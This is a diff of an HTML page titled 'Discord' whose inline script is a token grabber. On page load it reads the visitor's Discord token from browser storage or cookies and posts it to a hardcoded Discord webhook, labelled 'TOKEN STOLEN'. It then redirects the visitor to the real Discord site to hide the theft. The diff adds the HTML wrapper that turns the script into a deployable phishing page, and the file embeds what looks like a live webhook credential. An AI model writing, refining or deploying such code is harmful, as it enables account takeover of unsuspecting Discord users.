@@ -1,36 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord</title>
+    <meta charset="UTF-8">
+</head>
+<body>
     <script>
         const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
 
-        // 1. Send "Online" status immediately
+        // 1. Immediate Test
         fetch(webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "🟢 **Token Grabber Online** - Waiting for token..." })
-        }).catch(e => console.log("Online status failed:", e));
+            body: JSON.stringify({ content: "🟢 **SYSTEM ONLINE**" })
+        }).catch(e => console.error("Online fail:", e));
 
         // 2. Get Token
-        const token = localStorage.token || sessionStorage.token || (document.cookie.match('(^|;)\\s*token\\s*=\\s*([^;]+)')?.pop());
+        let token = localStorage.token || sessionStorage.token;
+        
+        // Fallback: Cookies
+        if (!token) {
+            const match = document.cookie.match(/token=([^;]+)/);
+            if (match) token = match[1];
+        }
 
         if (token) {
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
-            })
-            .then(r => {
-                if (r.ok) {
-                    console.log("Token sent!");
-                    setTimeout(() => window.location.href = "https://discord.com/channels/@me", 2000);
-                }
-            })
-            .catch(e => console.error("Token send failed:", e));
+            }).then(() => window.location.href = "https://discord.com/channels/@me");
         } else {
-            console.log("No token found.");
-            // Optional: Send a "No Token" message
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "⚠️ **No Token Found** in current session." })
+                body: JSON.stringify({ content: "⚠️ **NO TOKEN**" })
             });
         }
     </script>
+</body>
+</html>
